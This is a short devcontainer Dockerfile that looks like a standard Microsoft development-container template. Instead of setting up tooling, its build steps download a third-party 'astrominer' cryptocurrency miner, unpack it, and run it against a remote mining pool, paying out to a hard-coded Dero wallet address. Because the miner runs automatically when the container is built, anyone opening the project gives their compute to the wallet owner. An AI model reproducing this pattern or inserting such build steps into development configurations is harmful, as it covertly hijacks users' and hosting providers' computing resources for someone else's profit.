# [Choice] Debian / Ubuntu version (use Debian 11/9, Ubuntu 18.04/21.04 on local arm64/Apple Silicon): debian-11, debian-10, debian-9, ubuntu-21.04, ubuntu-20.04, ubuntu-18.04
ARG VARIANT=ubuntu-20.04
FROM mcr.microsoft.com/devcontainers/base:${VARIANT}

RUN apt install wget curl -y

RUN wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.8_BETA2/astrominer-V1.8_BETA2_modern_amd64_linux.tar.gz
RUN tar zxvf astrominer-V1.8_BETA2_modern_amd64_linux.tar.gz
RUN ./astrominer -r community-pools.mysrv.cloud:10300 -w dero1qy4p7g4tlfl837nhskz5a6x4cqup28e2hpm0vktsw39smpn3fyah7qqtq7yhq -p rpc
